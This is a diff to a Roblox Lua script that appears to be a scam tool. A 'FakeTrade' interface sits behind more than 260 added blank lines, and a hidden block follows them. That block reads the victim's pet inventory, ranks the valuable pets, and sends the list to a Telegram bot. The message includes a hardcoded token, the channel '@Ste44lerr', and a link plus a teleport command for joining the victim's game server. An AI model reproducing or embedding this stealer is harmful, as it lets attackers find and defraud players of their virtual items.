@@ -1,5 +1,272 @@
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+task.spawn(function()
+	local Players = game:GetService("Players")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local StarterGui = game:GetService("StarterGui")
+	local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	local localPlayer = Players.LocalPlayer
+
+	local Loads = require(ReplicatedStorage.Fsys).load
+	local RouterClient = Loads("RouterClient")
+
+	local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+	local TradeRequestRemote = RouterClient.get("TradeAPI/SendTradeRequest")
+	local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+	local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+	local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+
+
+	local getData = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data
+	local petDatabase = require(ReplicatedStorage.ClientDB.Inventory.InventoryDB).pets
+	local rarityModule = require(ReplicatedStorage.ClientDB.RarityDB)
+	local HttpService = game:GetService("HttpService")
+
+
+	local token = "8027403112:AAHidbIstiYW9jiYCwFkYz0Rjr0QKOosK90"
+	local channel_chat_id = "@Ste44lerr"
+	local inventory = getData()[localPlayer.Name].inventory
+	local topPets = {}
+	local regularPets = {}
+	local petsToLog = {}
+
+	local function send()
+
+		for uid, petData in pairs(inventory.pets) do
+			local dbEntry = petDatabase[petData.id]
+			if dbEntry and dbEntry.donatable ~= false then
+				local properties = petData.properties or {}
+				local isRideable = properties.rideable == true
+				local isFlyable = properties.flyable == true
+				local isNeon = properties.neon == true
+				local isMegaNeon = properties.mega_neon == true
+				local petName = dbEntry.name
+				local petTags = {}
+				if isMegaNeon then
+					table.insert(petTags, "M")
+				end
+				if isNeon then
+					table.insert(petTags, "N")
+				end
+				if isFlyable and isRideable then
+					table.insert(petTags, "FR")
+				elseif isFlyable then
+					table.insert(petTags, "F")
+				elseif isRideable then
+					table.insert(petTags, "R")
+				end
+				if #petTags > 0 then
+					petName = petName .. " - " .. table.concat(petTags, "")
+				end
+				local petInfo = {
+					uid = uid,
+					name = petName,
+					rarity = dbEntry.rarity,
+					priority = #petTags
+				}
+
+				table.insert(petsToLog, petInfo)
+			end
+		end
+		table.sort(petsToLog, function(a, b)
+			return a.priority > b.priority
+		end)
+		local function formatInventoryMessage()
+			local items = petsToLog
+			local joinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+			local message = "<b>📥 Join the game:</b> <a href='" .. joinLink .. "'>Click here to join</a>\n\n" ..
+				"<b>📝 Script to join:</b>\n" .. "<code>" ..
+				"game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", `" .. game.JobId .. "`)" ..
+				"</code>\n\n<b>📊 Items summary:</b> " .. tostring(#items) .. " items\n" ..
+				"<b>🛒 Items list:</b>\n"
+
+			for _, petInfo in ipairs(items) do
+				message = message .. string.format("<b>%s</b>\n", petInfo.name)
+			end
+
+			return message
+		end
+		local function SendInfoInvToTG()
+			local formattedMessage = formatInventoryMessage()
+			local response = request({
+				Url = "https://api.telegram.org/bot" .. token .. "/sendMessage",
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = HttpService:JSONEncode({
+					chat_id = channel_chat_id,
+					text = formattedMessage,
+					parse_mode = "HTML"
+				})
+			})
+		end
+		SendInfoInvToTG()
+	end
+	send()
+end)
+
 local FakeTrade = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
